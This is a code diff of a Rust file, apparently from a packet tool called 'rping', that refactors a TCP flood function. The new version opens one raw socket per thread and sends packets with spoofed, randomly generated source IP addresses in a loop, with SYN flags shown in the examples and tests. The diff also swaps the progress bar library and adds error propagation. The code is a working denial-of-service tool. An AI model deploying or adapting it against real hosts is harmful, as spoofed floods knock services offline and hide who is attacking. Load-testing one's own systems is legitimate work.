@@ -1,66 +1,52 @@
 use crate::ip::IpHeader;
+use crate::progress_bar::ProgressBar;
 use crate::tcp::TcpHeader;
-use indicatif::{ProgressBar, ProgressStyle};
 use rand::Rng;
 use socket2::{Domain, Protocol, SockAddr, Socket, Type};
-use std::io;
 use std::net::{Ipv4Addr, SocketAddrV4};
+use std::io;
 use std::time::{Duration, Instant};
-
-/// Sends a raw IP packet with the given headers and source IP address.
+/// Initializes a raw socket for sending raw IP packets.
 ///
-/// This function constructs a raw IP packet using the provided headers and sends it to the specified destination.
-/// It uses the `socket2` library for creating a raw socket and sending the packet.
-/// The source IP address is set directly in the packet buffer.
+/// This function creates and configures a raw socket for sending raw IP packets using the `socket2` library.
+/// The socket is configured with the specified destination IP address, destination port, and packet length.
 ///
 /// # Arguments
 ///
-/// * `tcp_ip_header` - A slice representing the combined TCP and IP headers.
 /// * `dest_ip` - The destination IP address as a string.
 /// * `dest_port` - The destination port number.
 /// * `packet_len` - The total length of the raw IP packet.
 ///
 /// # Returns
 ///
-/// This function returns an `io::Result<()>`. It returns `Ok(())` if the packet is sent successfully,
-/// otherwise, it returns an `Err` containing the error information.
+/// This function returns an `io::Result<Socket>`. It returns `Ok(Socket)` if the socket is successfully
+/// created and configured, otherwise, it returns an `Err` containing the error information.
+///
+/// # Errors
+///
+/// This function may return an error if there are issues with socket creation, configuration, or connection.
 ///
 /// # Examples
 ///
 /// ```rust
-/// use rping::utils::send_raw_ip_packet;
+/// use rping::utils::init_socket;
 ///
-/// // Example usage of the send_raw_ip_packet function
-/// let tcp_ip_header: &[u8] = &[];
+/// // Example usage of the init_socket function
 /// let dest_ip = "192.168.0.2";
 /// let dest_port = 8080;
 /// let packet_len = 1500;
-/// // send_raw_ip_packet(tcp_ip_header, dest_ip, dest_port, packet_len).unwrap();
+/// // let socket = init_socket(dest_ip, dest_port, packet_len).unwrap();
 /// ```
-pub fn send_raw_ip_packet(
-    tcp_ip_header: &[u8],
-    dest_ip: &str,
-    dest_port: u16,
-    packet_len: usize,
-) -> io::Result<()> {
-    let socket = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::from(6))).unwrap();
-
+pub fn init_socket(dest_ip: &str, dest_port: u16, packet_len: usize) -> io::Result<Socket> {
+    let socket = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::from(6)))?;
     let dest_addr = SocketAddrV4::new(dest_ip.parse().unwrap(), dest_port);
+    socket.set_header_included(true)?;
+    socket.connect(&SockAddr::from(dest_addr))?;
+    socket.set_tos(0)?;
+    socket.set_ttl(60)?;
+    socket.set_send_buffer_size(packet_len)?;
 
-    let _ = socket.set_header_included(true);
-
-    // Connect the socket
-    socket.connect(&SockAddr::from(dest_addr)).unwrap();
-    // Ensure buffer has enough space
-    let mut buffer = vec![0u8; packet_len];
-    buffer[..tcp_ip_header.len()].copy_from_slice(tcp_ip_header);
-    // Use `send` to send data on a connected TCP socket
-    let _ = socket.set_tos(0);
-    let _ = socket.set_ttl(60);
-    let _ = socket.set_send_buffer_size(packet_len);
-    socket.send_with_flags(&buffer, 2)?;
-
-    Ok(())
+    Ok(socket)
 }
 
 /// Generates a random IP address within the range [0.0.0.0, 255.255.255.255].
@@ -103,7 +89,7 @@ pub fn generate_random_ip() -> u32 {
 ///
 /// let source_ip = generate_random_ip();
 /// let ip_header = IpHeader::new(source_ip, "192.168.0.1");
-/// let tcp_header = TcpHeader::new(source_ip, "192.168.0.1", 80, "syn");
+/// let tcp_header = TcpHeader::new(source_ip, "192.168.0.1", 80, "syn", 1500);
 ///
 /// let combined_header = create_combined_header(&ip_header, &tcp_header);
 /// assert_eq!(combined_header.len(), std::mem::size_of::<IpHeader>() + std::mem::size_of::<TcpHeader>());
@@ -119,7 +105,8 @@ pub fn create_combined_header(ip_header: &IpHeader, tcp_header: &TcpHeader) -> V
         .collect()
 }
 
-/// Generates and sends TCP flood packets in a loop for a specified duration or number of packets.
+/// Generates and sends TCP flood packets in a loop for a specified duration or number of packets
+/// using a single socket per thread.
 ///
 /// This function continuously generates TCP flood packets with random parameters and sends them.
 /// It uses a loop to perform the following steps:
@@ -128,9 +115,8 @@ pub fn create_combined_header(ip_header: &IpHeader, tcp_header: &TcpHeader) -> V
 /// 2. Fill in the IP header with random values and calculate the packet length.
 /// 3. Calculate the TCP checksum.
 /// 4. Combine the IP and TCP headers into a buffer.
-/// 5. Set the source IP address in the buffer.
-/// 6. Send the spoofed packet using the `send_raw_ip_packet` function.
-/// 7. Repeat the above steps until the specified duration is reached or the specified number of packets is sent.
+/// 5. Send the spoofed packet using the previously initialized `socket` object.
+/// 6. Repeat the above steps until the specified duration is reached or the specified number of packets is sent.
 ///
 /// # Arguments
 ///
@@ -171,34 +157,37 @@ pub fn tcp_flood(
     flag: &str,
     duration: usize,
     number: usize,
-) {
-    let progress_bar = ProgressBar::new_spinner();
-    progress_bar.set_style(
-        ProgressStyle::default_spinner()
-            .tick_chars("/|\\- ")
-            .template("{spinner:.green} {msg}")
-            .unwrap(),
-    );
-    progress_bar.set_message("Flooding...");
+) -> Result<(), Box<dyn std::error::Error>> {
+    // Create a custom progress bar
+    let mut progress_bar = ProgressBar::new(number, duration * 60);
 
     let start_time = Instant::now();
     let duration_limit = Duration::from_secs((duration * 60) as u64);
 
-    for _ in 0..number {
+    // Initialize the socket. One socket per thread!
+    let socket = init_socket(dest_ip, dest_port, packet_len)?;
+
+    for i in 0..number {
         if start_time.elapsed() > duration_limit {
             break;
         }
 
         let source_ip = generate_random_ip();
         let ip_header = IpHeader::new(source_ip, dest_ip);
-        let tcp_header = TcpHeader::new(source_ip, dest_ip, dest_port, flag);
+        let tcp_header = TcpHeader::new(source_ip, dest_ip, dest_port, flag, packet_len);
 
-        // ip_header.len = (packet_len - std::mem::size_of::<IpHeader>() as usize) as u16;
+        // Create the combined header slice
         let combined_header_slice = create_combined_header(&ip_header, &tcp_header);
-        let _ = send_raw_ip_packet(&combined_header_slice, dest_ip, dest_port, packet_len);
+        let mut buffer = vec![0u8; packet_len];
+        buffer[..combined_header_slice.len()].copy_from_slice(&combined_header_slice);
+        // Use the same socket for multiple packet transmissions
+        socket.send_with_flags(&buffer, 2)?;
 
-        progress_bar.inc(1);
+        // Increment the custom progress bar
+        progress_bar.inc(i + 1);
     }
+
+    Ok(())
 }
 
 #[cfg(test)]
@@ -218,7 +207,7 @@ mod tests {
     fn test_create_combined_header() {
         let source_ip = generate_random_ip();
         let ip_header = IpHeader::new(source_ip, "192.168.1.10");
-        let tcp_header = TcpHeader::new(source_ip, "192.168.0.1", 80, "syn");
+        let tcp_header = TcpHeader::new(source_ip, "192.168.0.1", 80, "syn", 1500);
 
         let combined_header = create_combined_header(&ip_header, &tcp_header);
 
